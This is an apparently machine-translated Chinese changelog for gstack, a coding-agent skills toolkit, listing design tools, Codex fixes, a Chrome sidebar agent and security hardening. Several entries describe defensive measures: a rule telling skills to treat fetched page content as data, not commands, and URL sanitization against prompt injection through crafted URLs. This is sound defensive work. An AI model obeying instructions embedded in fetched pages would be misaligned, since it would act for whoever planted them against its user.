- **Shell 配置脚本验证输入。** `gstack-config` 拒绝正则表达式特殊键并转义 sed 模式。 `gstack-telemetry-log` 清理 JSON 输出中的branch/repo 名称。

### 额外

- 20 个回归测试，涵盖所有强化更改。

## [0.13.0.0] - 2026-03-27。您的代理现在就可以设计

gstack 可以生成真实的 UI 模型。不是 ASCII 艺术，不是十六进制代码的文本描述，而是您可以查看、比较、挑选和迭代的真实视觉设计。在 UI 创意上运行 `/office-hours` ，您将在 Chrome 中获得 3 个视觉概念，并带有一个比较板，您可以在其中选择您最喜欢的，评价其他的，并告诉代理要更改哪些内容。

### 额外

- **设计二进制** (`$D`)。新编译的 CLI 包装了 OpenAI 的 GPT 图像 API。 13 个命令：`generate`、`variants`、`iterate`、`check`、`compare`、`extract`、`diff`、`verify`、`evolve`、`prompt`、`serve`、`gallery`、`setup`。在约 40 秒内根据结构化设计概要生成像素完美的 UI 模型。
- **比较板。** `$D compare` 生成一个独立的 HTML 页面，其中包含所有变体、星级、每个变体的反馈、重新生成控件、混音网格（将 A 的布局与 B 的颜色混合）和“提交”按钮。反馈通过 HTTP POST（而不是 DOM 轮询）流回代理。
- **`/design-shotgun` 技能。** 您可以随时运行独立的设计探索。生成多个 AI 设计变体，在浏览器中打开比较板，然后进行迭代，直到您批准一个方向。会话意识（记住之前的探索）、品味记忆（让新一代偏向您所表现出的偏好）、屏幕截图到变体（屏幕截图您不喜欢的内容，获得改进）、可配置的变体计数（3-8）。
- **`$D serve` 命令。** 用于比较板反馈循环的 HTTP 服务器。在本地主机上提供开发板，在默认浏览器中打开，通过 POST 收集反馈。有状态：在再生轮次中保持活动状态，通过 `/api/progress` 轮询支持相同选项卡重新加载。
- **`$D gallery` 命令。** 生成项目所有设计探索的 HTML 时间线：每个变体、反馈，按日期组织。
- **设计记忆。** `$D extract` 使用 GPT-4o 视觉分析经批准的模型，并将颜色、排版、间距和布局模式写入 DESIGN.md。同一项目的未来模型继承了既定的视觉语言。
- **视觉比较。** `$D diff` 比较两个图像并按区域和严重程度识别差异。 `$D verify` 将实时站点屏幕截图与已批准的模型进行比较，通过 /fail 门。
- **屏幕截图演变。** `$D evolve` 截取您的实时网站的屏幕截图，并根据您的反馈生成显示其外观的模型。从现实出发，而不是从空白画布开始。
- **响应式变体。** `$D variants --viewports desktop,tablet,mobile` 生成多种视口尺寸的模型。
- **设计到代码提示。** `$D prompt` 从批准的模型中提取实现指令：精确的十六进制颜色、字体大小、间距值、组件结构。零解释差距。

### 改变了

- **/office-hours** 现在默认生成视觉模型探索（可跳过）。在生成 HTML 线框图之前，比较板会在浏览器中打开以获取反馈。
- **/plan-design-review** 使用 `{{DESIGN_SHOTGUN_LOOP}}` 作为比较板。当设计尺寸率低于 7/10 时，可以生成“10/10 的样子”模型。
- **/design-consultation** 使用 `{{DESIGN_SHOTGUN_LOOP}}` 进行第 5 阶段 AI 模型审查。
- **比较板提交后生命周期。**提交后，所有输入都将被禁用，并显示“返回您的编码代理”消息。重新生成后，当新设计准备就绪时，旋转器会显示自动刷新。如果服务器消失，则会出现可复制的 JSON 后备。

### 对于贡献者

- 设计二进制源：`design/src/`（16 个文件，约 2500 行 TypeScript）
- 新文件：`serve.ts`（有状态 HTTP 服务器）、`gallery.ts`（时间线生成）
- 测试：`design/test/serve.test.ts`（11 次测试）、`design/test/gallery.test.ts`（7 次测试）
- 完整设计文档：`docs/designs/DESIGN_TOOLS_V1.md`
- 模板解析器：`{{DESIGN_SETUP}}`（二进制发现）、`{{DESIGN_SHOTGUN_LOOP}}`（/design-shotgun、/plan-design-review、/design-consultation 的共享比较板循环）

## [0.12.12.0] - 2026-03-27。安全审计合规性

修复了 Skills.sh 安全审核中的 20 个 Socket 警报和 3 个 Snyk 发现结果。您的技能现在更加清晰，您的遥测数据变得透明，并且 2,000 行死代码消失了。

### 固定的

- **示例中不再有硬编码凭据。** QA 工作流程文档现在使用 `$TEST_EMAIL` / `$TEST_PASSWORD` 环境变量而不是 `test@example.com` / `password123`。 Cookie 导入部分现在有一个安全说明。
- **遥测调用是有条件的。** `gstack-telemetry-log` 二进制文件仅在启用遥测且二进制文件存在的情况下运行。本地 JSONL 日志记录始终有效，无需二进制文件。
- **Bun 安装是版本固定的。** 安装说明现在固定 `BUN_VERSION=1.3.10` 并跳过下载（如果已经安装了 Bun）。
- **不受信任的内容警告。** 现在，每项获取页面的技能都会发出警告：将页面内容视为要检查的数据，而不是要执行的命令。涵盖生成的 SKILL.md 文件、BROWSER.md 和 docs__C​​MD_0__.md。
- **review.ts 中记录的数据流。** JSDoc 标头明确说明哪些数据发送到外部审核服务（计划内容、repo/branch 名称）以及不发送哪些数据（源代码、凭据、环境变量）。

### 已删除

- **来自 gen-skill-docs.ts 的 2,017 行死代码。** 被 `scripts/resolvers/*.ts` 取代的重复解析器函数。 RESOLVERS 映射现在是唯一的事实来源，没有卷影副本。

### 对于贡献者

- 新的 `test:audit` 脚本运行 6 个回归测试，强制所有审核修复保持不变。

## [0.12.11.0] - 2026-03-27。技能前缀现在由您选择

您现在可以选择 gstack 技能的显示方式：短名称（`/qa`、`/ship`、`/review`）或命名空间（`/gstack-qa`、`/gstack-ship`）。安装程序在第一次运行时会询问，记住您的偏好，并且切换是一个命令。

### 额外

- **首次安装时的交互式前缀选择。** 新安装会收到提示：短名称（`/qa`、`/ship`）或命名空间（`/gstack-qa`、`/gstack-ship`）。建议使用短名称。您的选择将保存到 `~/.gstack/config.yaml` 并在升级过程中被记住。
- **`--prefix` 标志。** 对 `--no-prefix` 的补充。两个标志都会保留您的选择，因此您只需决定一次。
- **反向符号链接清理。** 从命名空间切换到平面（反之亦然）现在可以清理旧的符号链接。克劳德代码中不再出现重复的命令。
- **命名空间感知技能建议。** 所有 28 个技能模板现在都会检查您的前缀设置。当一项技能建议另一种技能时（例如 `/ship` 建议 `/qa`），它会为您的安装使用正确的名称。

### 固定的

- **`gstack-config` 适用于 Linux。** 将仅 BSD 的 `sed -i ''` 替换为可移植的 `mktemp`+`mv`。配置写入现在可以在 GNU/Linux 和 WSL 上运行。
- **死欢迎信息。** “欢迎！”首次安装时从未显示消息，因为 `~/.gstack/` 是在安装过程中较早创建的。使用 `.welcome-seen` 哨兵文件修复。

### 对于贡献者

- 前缀配置系统的 8 个新结构测试（gen-skill-docs 中总共 223 个）。

## [0.12.10.0] - 2026-03-27。 Codex 文件系统边界

Codex 徘徊在 `~/.claude/skills/` 并遵循 gstack 自己的说明，而不是检查您的代码。现在，每个 Codex 提示都包含一条边界指令，使其专注于存储库。涵盖 /codex、/autoplan、/review、/ship、/plan-eng-review、/plan-ceo-review 和 /office-hours 中的所有 11 个调用点。

### 固定的

- **Codex 保留在存储库中。** 所有 `codex exec` 和 `codex review` 调用现在都在前面添加一条文件系统边界指令，告诉 Codex 忽略技能定义文件。防止 Codex 读取 SKILL.md 前导码脚本并在会话跟踪和升级检查上浪费 8 分钟以上。
- **兔子洞检测。** 如果 Codex 输出包含被技能文件干扰的迹象（`gstack-config`、`gstack-update-check`、`SKILL.md`、`skills/gstack`），/codex 技能现在会发出警告并建议重试。
- **5 个回归测试。** 新的测试套件验证边界文本出现在所有 7 个 Codex 调用技能中，文件系统边界部分存在，兔子洞检测规则存在，并且自动计划使用跨主机兼容的路径模式。

## [0.12.9.0] - 2026-03-27。社区 PR：更快的安装、技能命名空间、卸载

一批落地6个社区PR。安装速度更快，技能不再与其他工具发生冲突，并且您可以在需要时干净地卸载 gstack。

### 额外

- **卸载脚本。** `bin/gstack-uninstall` 从系统中干净地删除 gstack：停止浏览守护进程，删除所有技能安装 (Claude/Codex/Kiro)，清理状态。支持 `--force` （跳过确认）和 `--keep-state` （保留配置）。 （＃323）
- **/review 中的 Python 安全模式。** Shell 注入 (`subprocess.run(shell=True)`)、通过 LLM 生成的 URL 进行 SSRF、存储提示注入、async/sync 混合和列名安全检查现在会在 Python 项目上自动触发。 (#531)
- **办公时间无需 Codex 即可工作。** 当 Codex CLI 不可用时，“第二意见”步骤现在会退回到 Claude 子代理，因此每个用户都可以获得跨模型视角。 (#464)

### 改变了

- **安装速度更快（约 30 秒）。** 所有克隆命令现在都使用 `--single-branch --depth 1`。贡献者可以获得完整的历史记录。 (#484)
- **以 `gstack-` 前缀命名的技能。** 技能符号链接现在为 `gstack-review`、`gstack-ship` 等，而不是裸露的 `review`、`ship`。防止与其他技能包发生碰撞。旧的符号链接在升级时会自动清除。使用 `--no-prefix` 选择退出。 （#503）

### 固定的

- **Windows 端口竞争条件。** `findPort()` 现在使用 `net.createServer()` 而不是 `Bun.serve()` 进行端口探测，修复了 Windows 上的 EADDRINUSE 竞争，其中 polyfill 的 `stop()` 是即发即忘的。 （#490）
- **package.json 版本同步。** VERSION 文件和 package.json 现在一致（停留在 0.12.5.0）。

## [0.12.8.1] - 2026-03-27。 zsh 全局兼容性

技能脚本现在可以在 zsh 中正常工作。以前，技能模板中的 bash 代码块使用 `.github/workflows/*.yaml` 和 `ls ~/.gstack/projects/$SLUG/*-design-*.md` 等原始 glob 模式，当没有文件匹配时，这些模式会在 zsh 中抛出“未找到匹配项”错误。使用两种方法修复了 13 个模板和 2 个解析器中的 38 个实例：针对复杂模式的基于 `find` 的替代方案，以及针对简单 `ls` 命令的 `setopt +o nomatch` 防护。

### 固定的

- **`.github/workflows/` 全局变量替换为 `find`。** `/land-and-deploy`、`/setup-deploy`、`/cso` 中的 `cat .github/workflows/*deploy*`、`for f in .github/workflows/*.yml` 和 `ls .github/workflows/*.yaml` 模式，并且部署引导解析器现在使用 `find ... -name` 而不是原始全局变量。
- **`~/.gstack/` 和 `~/.claude/` 全局由 `setopt` 保护。** 设计文档查找、评估结果列表、测试计划发现和跨 10 项技能的追溯历史检查现在在前面加上 `setopt +o nomatch 2>/dev/null||true`（bash 中无操作，zsh 中禁用 NOMATCH）。
- **测试框架检测 glob 受到保护。** 测试解析器中的 `ls jest.config.* vitest.config.*` 现在有一个 setopt 保护。

## [0.12.8.0] - 2026-03-27。 Codex 不再审查错误的项目

当您在打开多个工作区的 Conductor 中运行 gstack 时，Codex 可能会默默地审查错误的项目。 `codex exec -C` 标志通过 `$(git rev-parse --show-toplevel)` 内联解析存储库根，它以后台 shell 继承的任何 cwd 进行计算。在多工作空间环境中，该 cwd 可能是完全不同的项目。

### 固定的

- **Codex exec 急切地解析存储库根目录。** `/codex`、`/autoplan` 和 4 个解析器函数中的所有 12 个 `codex exec` 命令现在解析每个 bash 块顶部的 `_REPO_ROOT` 并引用 `-C` 中存储的值。不再需要与其他工作区竞争的内联评估。
- **`codex review` 也获得 cwd 保护。** `codex review` 不支持 `-C`，因此现在在调用之前获得 `cd "$_REPO_ROOT"`。同一类错误，不同的命令。
- **静默回退被硬故障取代。** `||pwd` 后备默默地使用任何可用的随机 cwd。现在，如果不在 git 存储库中，它会出错并显示清晰的消息。

### 已删除

- **gen-skill-docs.ts 中的死解析器副本。** 几个月前移动到 `scripts/resolvers/` 但从未删除的六个函数。它们已经脱离了实时版本并包含了旧的易受攻击的模式。

### 额外

- **回归测试**，使用内联 `$(git rev-parse --show-toplevel)` 扫描所有 `.tmpl`、解析器 `.ts` 并为 codex 命令生成 `SKILL.md` 文件。防止重新引入。

## [0.12.7.0] - 2026-03-27。社区 PR + 安全强化

合并、审查和测试了七个社区贡献。加上遥测和审查日志记录的安全强化，以及端到端测试稳定性修复。

### 额外

- **技能发现中的点文件过滤。** 隐藏目录（`.git`、`.vscode` 等）不再被选取为技能模板。
- **审核日志中的 JSON 验证门。** 格式错误的输入将被拒绝，而不是附加到 JSONL 文件中。
- **遥测输入清理。** 所有字符串字段在写入 JSONL 之前都会去除引号、反斜杠和控制字符。
- **特定于主机的共同作者预告片。** `/ship` 和 `/document-release` 现在使用 Codex 与 Claude 的正确共同作者行。
- **10 个新的安全测试**，涵盖遥测注入、审查日志验证和点文件过滤。

### 固定的

- **以 `./` 开头的文件路径不再被视为 CSS 选择器。** `$B screenshot ./path/to/file.png` 现在可以工作，而不是尝试查找 CSS 元素。
- **构建链弹性。** `gen:skill-docs` 失败不再阻止二进制编译。
- **更新检查器失败。** 升级后，检查器现在还会检查较新的远程版本而不是停止。
- **不稳定的 E2E 测试已稳定。** `browse-basic`、`ship-base-branch` 和 `review-dashboard-via` 测试现在可以通过仅提取相关的 SKILL.md 部分而不是将完整的 1900 行文件复制到测试装置中来可靠地通过。
- **删除了不可靠的 `journey-think-bigger` 路由测试。** 从未可靠地通过，因为路由信号太模糊。其他 10 项旅程测试涵盖信号清晰的路线。

### 对于贡献者

- 新的 CLAUDE.md 规则：切勿将完整的 SKILL.md 文件复制到 E2E 测试装置中。仅提取相关部分。

## [0.12.6.0] - 2026-03-27。侧边栏知道您在哪个页面

当您要求 Chrome 侧边栏代理执行某些操作时，它通常会导航到错误的页面。如果您手动浏览到某个站点，侧边栏将忽略该站点并转到剧作家最后看到的任何内容（通常是演示中的黑客新闻）。现在可以了。

### 固定的

- **侧边栏使用真实的选项卡 URL。** Chrome 扩展程序现在通过 `chrome.tabs.query()` 捕获实际页面 URL 并将其发送到服务器。以前，侧边栏代理使用 Playwright 的过时的 `page.url()`，当您在标题模式下手动导航时，它不会更新。
- **URL 清理。** 扩展提供的 URL 在用于 Claude 系统提示符之前会经过验证（仅限 http/https，删除控制字符，2048 个字符限制）。防止通过精心设计的 URL 进行提示注入。
- **过时的侧边栏代理在重新连接时被杀死。** 每个 `/connect-chrome` 现在都会在启动新的侧边栏代理进程之前杀死剩余的侧边栏代理进程。旧代理具有陈旧的身份验证令牌，并且会默默地失败，导致侧边栏冻结。

### 额外

- **飞行前清理 `/connect-chrome`。** 在连接之前杀死过时的浏览服务器并清理 Chromium 配置文件锁。防止崩溃后出现“已连接”误报。
- **侧边栏代理测试套件（36 个测试）。** 四层：URL 清理的单元测试、服务器 HTTP 端点的集成测试、模拟 Claude 往返测试以及​​真实 Claude 的 E2E 测试。除第 4 层外，全部免费。

## [0.12.5.1] - 2026-03-27。工程评论现在告诉您要并行化什么

`/plan-eng-review` 自动分析您的计划以获取并行执行机会。当您的计划具有独立的工作流时，审查会输出依赖关系表、并行通道和执行顺序，以便您准确地知道将哪些任务拆分为单独的 git 工作树。

### 额外

- `/plan-eng-review` 所需输出中的 **工作树并行化策略**。提取具有模块级依赖关系的计划步骤的结构化表，计算并行通道，并标记合并冲突风险。自动跳过单模块或单轨道计划。

## [0.12.5.0] - 2026-03-26。修复 Codex 挂起：30 分钟的等待消失了

`/codex` 中的三个错误导致计划审查和对抗性检查期间出现 30 多分钟的挂起且输出为零。这三个都已固定。

### 固定的

- **计划文件现在对 Codex 沙箱可见。** Codex 在存储库根目录的沙箱中运行，并且无法在 `~/.claude/plans/` 处看到计划文件。在放弃之前会浪费 10 多个工具调用进行搜索。现在，计划内容直接嵌入到提示中，并列出引用的源文件，以便 Codex 立即读取它们。
- **流输出实际上是流。** Python 的 stdout 缓冲意味着在进程退出之前可见的输出为零。在所有三种 Codex 模式的每次打印调用中添加了 `PYTHONUNBUFFERED=1`、`python3 -u` 和 `flush=True`。
- **合理的推理工作默认值。** 将硬编码的 `xhigh`（令牌增加 23 倍，已知每个 OpenAI 问题 #8545、#8402、#6931 的挂起时间超过 50 分钟）替换为每种模式的默认值：`high` 用于审查和质疑，`medium` 用于咨询。当用户想要最大程度的推理时，可以使用 `--xhigh` 标志进行覆盖。
- **`--xhigh` 覆盖适用于所有模式。** 挑战和咨询模式说明中缺少覆盖提醒。通过对抗性审查发现。

## [0.12.4.0] - 2026-03-26。 /ship 中的完整提交覆盖

当您发布一个包含 12 个提交（涵盖性能工作、死代码删除和基础测试）的分支时，PR 应该提及所有这三项。事实并非如此。变更日志和公关摘要偏向于最近发生的事情，默默地放弃了早期的工作。

### 固定的

- **/ship 步骤 5 (CHANGELOG)：** 现在强制在写入之前进行显式提交枚举。您列出每个提交，按主题分组，编写条目，然后交叉检查每个提交是否映射到项目符号。不再有近因偏差。
- **/ship 步骤 8（PR 正文）：** 从“CHANGELOG 中的要点”更改为显式逐次提交覆盖范围。将提交分组到逻辑部分。排除 VERSION/CHANGELOG 元数据提交（簿记，而不是更改）。每个实质性提交都必须出现在某个地方。

## [0.12.3.0] - 2026-03-26。语音指令：每项技能听起来都像建造者

现在每个 gstack 技能都有声音。不是个性，不是人物角色，而是一套一致的指令，使克劳德听起来像是今天发布代码并关心该东西是否适用于真实用户的人。直接、具体、尖锐。命名文件、函数、命令。将技术工作与用户的实际体验联系起来。

两层：轻量级技能得到修剪版本（语气+写作规则）。完整的技能通过上下文相关的语气获得完整的指令（YC 合作伙伴能量用于战略，高级工程师用于代码审查，博客文章清晰度用于调试）、具体标准、幽默校准和用户结果指导。

### 额外

- **所有 25 种技能中的语音指令。** 从 `preamble.ts` 生成，通过模板解析器注入。 1 级技能获得 4 线版本。 2+ 级技能获得完整指令。
- **取决于上下文的语气。** 匹配上下文：`/plan-ceo-review` 的 YC 合作伙伴、`/review` 的高级工程师、`/investigate` 的最佳技术博客文章。
- **具体性标准。** “显示确切的命令。使用实数。指向确切的线。”不是渴望的...强制的。
- **用户结果连接。**“这很重要，因为您的用户将看到一个 3 秒的旋转图标。”让用户的用户真实存在。
- **法学硕士评估测试。** 法官对直接性、具体性、反企业语气、人工智能词汇回避和用户结果联系进行评分。所有维度得分必须为 4/5+。

## [0.12.2.0] - 2026-03-26。充满信心地部署：首次试运行

第一次在项目上运行 `/land-and-deploy` 时，它会进行一次试运行。它会检测您的部署基础设施，测试每个命令是否有效，并在触及任何内容之前向您准确显示将会发生的情况。你确认了，从那时起它就起作用了。

如果您的部署配置稍后发生更改（新平台、不同的工作流程、更新的 URL），它会自动重新运行试运行。当情况发生变化时，信任就会被赢得、维持并重新验证。

### 额外

- **首次运行试运行。** 在验证表中显示您的部署基础架构：平台、CLI 状态、生产 URL 可访问性、分段检测、合并方法、合并队列状态。在发生不可逆转的事情之前您先确认。
- **暂存优先选项。** 如果检测到暂存（CLAUDE.md 配置、GitHub Actions 工作流程或 Vercel/Netlify 预览），您可以先在那里部署，验证其是否有效，然后继续生产。
- **配置衰减检测。** 试运行确认存储部署配置的指纹。如果 CLAUDE.md 的部署部分或您的部署工作流程发生更改，则会自动重新触发试运行。
- **内联审查门。** 如果最近不存在代码审查，则在合并之前对差异进行快速安全检查。在部署时捕获 SQL 安全性、竞争条件和安全问题。
- **合并队列感知。** 检测您的存储库何时使用合并队列并解释等待时发生的情况。
- **CI 自动部署检测。** 识别合并触发的部署工作流程并监控它们。

### 改变了

- **完整副本重写。** 每条面向用户的消息都经过重写，以叙述正在发生的事情、解释原因并具体说明。第一次运行=教师模式。后续运行 = 高效模式。
- **语音和语气部分。** 关于技能如何交流的新指南：成为坐在开发人员旁边的高级发布工程师，而不是机器人。

## [0.12.1.0] - 2026-03-26。更智能的浏览：网络空闲、状态持久、Iframe

现在，每次单击、填充和选择都会等待页面稳定后再返回。不再有过时的快照，因为 XHR 仍在运行中。 Chain 接受管道分隔格式，以实现更快的多步骤流程。您可以保存和恢复浏览器会话（cookie + 打开的选项卡）。现在可以访问 iframe 内容。

### 额外

- **网络空闲检测。** `click`、`fill` 和 `select` 在返回之前自动等待最多 2 秒以解决网络请求。捕获由交互触发的 XHR/fetch。使用 Playwright 的内置 `waitForLoadState('networkidle')`，而不是自定义跟踪器。

- **`$B state save/load`.** 将您的浏览器会话（cookies + 打开的选项卡）保存到指定文件中，稍后加载。存储在 `.gstack/browse-states/{name}.json` 的文件，权限为 0o600。 V1 仅保存 cookie + URL（不保存 localStorage，它会在导航前加载时中断）。加载替换当前会话，而不是合并。

- **`$B frame` 命令。** 将命令上下文切换到 iframe：`$B frame iframe`、`$B frame --name checkout`、`$B frame --url stripe` 或 `$B frame @e5`。所有后续命令（单击、填充、快照等）都在 iframe 内运行。 `$B frame main` 返回主页。快照显示 `[Context: iframe src="..."]` 标头。分离的帧自动恢复。

- **Chain 管道格式。** Chain 现在接受 `$B chain 'goto url|点击@e5|snapshot -ic'` 作为 JSON 解析失败时的后备。通过引号分隔的符号化。

### 改变了

- **链后循环空闲等待。**执行链中的所有命令后，如果最后一个是写入命令，则链在返回之前等待网络空闲。

### 固定的

- **Iframe 引用范围。** 快照引用定位器、光标交互式扫描和光标定位器现在使用帧感知目标，而不是始终将范围限定到主页。
- **分离帧恢复。** `getActiveFrameOrPage()` 检查 `isDetached()` 并自动恢复。
- **状态加载会重置帧上下文。** 加载已保存的状态会清除活动帧参考。
- **frame 命令中的 elementHandle 泄漏。** 现在在获取 contentFrame 后正确处理。
- **上传命令帧感知。** `upload` 使用文件输入定位器的帧感知目标。

## [0.12.0.0] - 2026-03-26。标题模式 + 侧边栏代理

现在，您可以在真实的 Chrome 窗口中观看 Claude 的工作，并通过侧边栏聊天进行指导。

### 额外

- **带有侧边栏代理的标题模式。** `$B connect` 使用 gstack 扩展启动可见的 Chrome 窗口。侧面板显示每个命令的实时活动提要以及您可以在其中键入自然语言指令的聊天界面。子 Claude 实例在浏览器中执行您的请求...导航页面、单击按钮、填写表单、提取数据。每个任务最多 5 分钟。

- **个人自动化。** 侧边栏代理处理开发工作流程之外的重复性浏览器任务。浏览您孩子的学校家长门户并将家长联系信息添加到 Google 通讯录。填写供应商入职表格。从仪表板中提取数据。在头浏览器中登录一次，或使用 `/setup-browser-cookies` 从您的真实 Chrome 导入 cookie。

- **Chrome 扩展程序。** 工具栏徽章（绿色=已连接，灰色=未连接），带有活动提要 + 聊天 + 参考选项卡的侧面板，页面上的 @ref 覆盖层，以及显示 gstack 控制哪个窗口的连接药丸。运行 `$B connect` 时自动加载。

- **`/connect-chrome` 技能。** 引导式设置：启动 Chrome、验证扩展、演示活动源并引入侧边栏聊天。

### 改变了

- **侧边栏代理未门控。** 以前需要 `--chat` 标志。现在始终在头部模式下可用。侧边栏代理具有与 Claude Code 本身相同的安全模型（本地主机上的 Bash、Read、Glob、Grep）。

- **代理超时提高到 5 分钟。** 多页面任务（导航目录、跨页面填写表单）需要超过之前的 2 分钟限制。

## [0.11.21.0] - 2026-03-26

### 固定的

- **`/autoplan` 审核现在计入船舶准备门。** 当 `/autoplan` 运行完整的 CEO + 设计 + 工程审核时，`/ship` 仍显示工程审核“0 次运行”，因为自动计划记录的条目未正确读取。现在，仪表板显示来源归属（例如，“CLEAR（通过 /autoplan 进行计划）”），以便您可以准确地看到哪个工具满足每个评论。
- **`/ship` 不再告诉您“首先运行 /review”。** 船舶在步骤 3.5 中运行自己的着陆前审查。要求您单独进行相同的审查是多余的。门被拆除；船就是这么做的。
- **`/land-and-deploy` 现在检查所有 8 种评论类型。** 之前错过了 `review`、`adversarial-review` 和 `codex-plan-review`。如果您只运行 `/review` （而不是 `/plan-eng-review`），则登陆和部署不会看到它。
- **仪表板外部语音行现在可以工作。** 即使外部语音在 `/plan-ceo-review` 或 `/plan-eng-review` 中运行后，仍显示“0 次运行”。现在正确映射到 `codex-plan-review` 条目。
- **`/codex review` 现在跟踪过时情况。** 将 `commit` 字段添加到法典审查日志条目中，以便仪表板可以检测到法典审查何时过时。
- **`/autoplan` 不再硬编码“干净”状态。** 查看自动计划中用于始终记录 `status:"clean"` 的日志条目，即使发现问题也是如此。现在使用正确的占位符标记，Claude 将其替换为实际值。

## [0.11.20.0] - 2026-03-26

### 额外

- **GitLab 支持 `/retro` 和 `/ship`。** 您现在可以在 GitLab 存储库上运行 `/ship`。它通过 `glab mr create` 而不是 `gh pr create` 创建合并请求。 `/retro` 检测两个平台上的默认分支。使用 `BASE_BRANCH_DETECT` 的所有 11 项技能都会自动获得 GitHub、GitLab 和 git-native 回退检测。
- **GitHub Enterprise 和自托管 GitLab 检测。** 如果远程 URL 与 `github.com` 或 `gitlab` 不匹配，gstack 将检查 `gh auth status` / `glab auth status` 以检测经过身份验证的平台。无需手动配置。
- **`/document-release` 适用于 GitLab。** `/ship` 创建合并请求后，自动调用的 `/document-release` 通过 `glab` 读取并更新 MR 主体，而不是默默失败。
- **`/land-and-deploy` 的 GitLab 安全门。** `/land-and-deploy` 现在提前停止，并明确表明 GitLab 合并支持尚未实现，而不是在 GitLab 存储库上默默失败。

### 固定的

- **删除重复的 gen-skill-docs 解析器。** 模板生成器具有重复的内联解析器函数，这些函数遮盖了模块化版本，导致生成的 SKILL.md 文件错过最近的解析器更新。

## [0.11.19.0] - 2026-03-24

### 固定的

- **自动升级不再中断。** root gstack 技能描述为 7 个字符，超出了 Codex 1024 个字符的限制。每一项新技能的添加都让这一目标更加接近。将技能路由表从描述（有界）移至正文（无限制），从 1017 个字符减少到 409 个字符，其中有 615 个字符的余量。
- **Codex 审查现在在正确的存储库中运行。** 在多工作空间设置（如 Conductor）中，Codex 可能会选择错误的项目目录。现在，所有 `codex exec` 调用都显式地将 `-C` 设置为 git 根目录。

### 额外

- **900 字符预警测试。** 如果任何 Codex 技能描述超过 900 个字符，新测试就会失败，在破坏构建之前捕获描述膨胀。

## [0.11.18.2] - 2026-03-24

### 固定的

- **Windows 浏览守护进程已修复。** 浏览服务器无法在 Windows 上启动，因为 Bun 需要 `stdio` 作为数组 (`['ignore', 'ignore', 'ignore']`)，而不是字符串 (`'ignore'`)。修复#448、#454、#458。

## [0.11.18.1] - 2026-03-24

### 改变了

- **每个问题一个决定。 ** 现在，每一项技能都一次呈现一个决策，每项决策都有自己的重点问题、建议和选项。不再有将不相关的选择捆绑在一起的文本墙问题。这已经在三个计划审查技能中得到了执行；现在，它已成为涵盖所有 23 种以上技能的通用规则。

## [0.11.18.0] - 2026-03-24。用牙齿船

`/ship` 和 `/review` 现在实际上执行了他们一直在谈论的质量门。覆盖率审核成为一个真正的大门（而不仅仅是一个图表），计划的完成情况将根据差异进行验证，并且计划中的验证步骤会自动运行。

### 额外

- **在 /ship 中测试覆盖率门。** AI 评估的覆盖率低于 60% 是硬停止。 60-79% 的人会收到提示。 80%以上通过。每个项目的阈值可通过 CLAUDE.md 中的 `## Test Coverage` 进行配置。
- **/review 中的覆盖率警告。** 现在，在到达 /ship 门之前，低覆盖率会被显着标记，因此您可以尽早编写测试。
- **计划完成审核。** /ship 读取您的计划文件，提取每个可操作的项目，对照差异进行交叉引用，并向您显示 DONE/NOT DONE/PARTIAL/CHANGED 清单。缺少的物品是运输障碍（有覆盖）。
- **计划感知范围漂移检测。** /review 的范围漂移检查现在也读取计划文件。不仅仅是 TODOS.md 和 PR 描述。
- **通过 /qa-only 自动验证。** /ship 读取计划的验证部分并内联运行 /qa-only 来测试它。如果开发服务器正在本地主机上运行。没有服务器，没问题。它优雅地跳过。
- **共享计划文件发现。** 首先是对话上下文，其次是基于内容的 grep 后备。用于计划完成、计划审查报告和验证。
- **船舶指标记录。** 记录覆盖率 %、计划完成率和验证结果，以查看 /retro 的 JSONL 以跟踪趋势。
- **计划在 /retro 中完成。** 每周回顾现在显示已发货分支机构的计划完成率。

## [0.11.17.0] - 2026-03-24。清洁技能描述 + 主动选择退出

### 改变了

- **技能描述现在清晰易读。**从每个技能描述中删除了丑陋的“仅手动触发”前缀，该前缀浪费了 58 个字符并导致 Codex 集成的构建错误。
- **您现在可以选择退出主动技能建议。** 第一次运行任何 gstack 技能时，系统会询问您是否希望 gstack 在工作流程中建议技能。如果您更喜欢手动调用技能，那就说“不”。它被保存为全局设置。您可以随时使用 `gstack-config set proactive true/false` 改变主意。

### 固定的

- **遥测源标记不再崩溃。**修复了遥测记录器中的持续时间保护和源字段验证，因此它可以干净地处理边缘情况而不是出错。

## [0.11.16.1] - 2026-03-24。安装 ID 隐私修复

### 固定的

- **安装 ID 现在是随机 UUID，而不是主机名哈希。** 旧的 `SHA-256(hostname+username)` 方法意味着任何知道您的计算机身份的人都可以计算您的安装 ID。现在使用存储在 `~/.gstack/installation-id` 中的随机 UUID。不可从任何公共输入中派生，可通过删除文件进行轮换。
- **RLS 验证脚本处理边缘情况。** `verify-rls.sh` 现在按预期正确处理 INSERT 成功（保留旧客户端兼容性），处理 409 冲突和 204 无操作。

## [0.11.16.0] - 2026-03-24。更智能的 CI + 遥测安全

### 改变了

- **CI 默认情况下仅运行门测试。每周运行定期测试。** 每个 E2E 测试现在都分类为 `gate`（阻止 PR）或 `periodic`（每周 cron + 按需）。门测试涵盖功能正确性和安全护栏。定期测试涵盖昂贵的 Opus 质量基准、非确定性路由测试以及需要外部服务的测试（Codex、Gemini）。 CI 反馈更快、更便宜，而质量基准仍然每周运行。
- **全局触摸文件现在是细粒度的。** 以前，更改 `gen-skill-docs.ts` 会触发所有 56 个 E2E 测试。现在只有大约 27 个实际依赖于它的测试运行。 `llm-judge.ts`、`test-server.ts`、`worktree.ts` 和 Codex/Gemini 会话运行程序也是如此。真正的全局列表只有 3 个文件（session-runner、eval-store、touchfiles.ts 本身）。
- **新的 `test:gate` 和 `test:periodic` 脚本**替换 `test:e2e:fast`。使用 `EVALS_TIER=gate` 或 `EVALS_TIER=periodic` 按层过滤测试。
- **遥测同步使用 `GSTACK_SUPABASE_URL` 而不是 `GSTACK_TELEMETRY_ENDPOINT`。** 边缘函数需要基本 URL，而不是 REST API 路径。旧变量已从 `config.sh` 中删除。
- **光标前进现在是安全的。** 同步脚本在前进之前检查边缘函数的 `inserted` 计数。如果插入了零个事件，则光标将保持并重试下一次运行。

### 固定的

- **遥测 RLS 策略收紧。** 所有遥测表上的行级安全策略现在拒绝通过匿名密钥进行直接访问。所有读取和写入都会通过经过验证的边缘函数，包括架构检查、事件类型允许列表和字段长度限制。
- **社区仪表板速度更快，并且是服务器缓存的。** 仪表板统计信息现在由具有 1 小时服务器端缓存的单个边缘功能提供，取代了多个直接查询。

### 对于贡献者

- `test/helpers/touchfiles.ts` 中的 `E2E_TIERS` 映射对每个测试进行分类。免费的验证测试确保它与 `E2E_TOUCHFILES` 保持同步
